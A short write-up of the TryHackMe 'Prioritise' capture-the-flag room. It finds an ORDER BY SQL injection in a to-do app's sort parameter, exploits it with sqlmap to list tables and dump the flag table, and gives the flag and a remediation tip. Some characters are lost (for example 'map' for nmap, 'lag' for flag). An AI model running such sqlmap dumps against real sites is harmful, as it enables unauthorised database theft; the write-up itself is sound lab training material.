# TryHackMe: Prioritise - Writeup

## Description
Prioritise is a CTF challenge featuring a simple to-do list application where tasks are ordered by priority. The goal is to identify and exploit a vulnerability in the sorting mechanism to find the hidden flag.

## Methodology

### 1. Enumeration
A port scan was performed using 
map, revealing two open ports:
- **Port 22 (SSH):** OpenSSH 8.2p1.
- **Port 80 (HTTP):** A web application called "Prioritise".

The web application allows users to add tasks with a **Title** and a **Due Date**. It also includes a sorting feature to order tasks by title, status, or date.

### 2. Vulnerability Identification (SQL Injection)
The sorting parameter order was tested for SQL injection. Appending a single quote (') to the order parameter in the URL (/?order=title') resulted in a **500 Internal Server Error**, confirming that the parameter is not properly sanitized and is directly used in an SQL query (likely ORDER BY).

### 3. Exploitation
Using sqlmap, the backend database was identified as **SQLite**. The following steps were taken to extract the flag:

- **List Tables:**
  `ash
  sqlmap -u "http://10.48.178.218/?order=title" --tables
  `
  Found two tables: 	odos and lag.

- **Dump Flag Table:**
  `ash
  sqlmap -u "http://10.48.178.218/?order=title" -T flag --dump
  `

## Flag
The flag was found in the lag table:
lag{65f2f8cfd53d59422f3d7cc62cc8fdcd}

## Conclusion
The application was vulnerable to an **Order-By SQL Injection** in the sorting parameter. Proper sanitization or using a whitelist of allowed sorting columns would prevent this vulnerability.
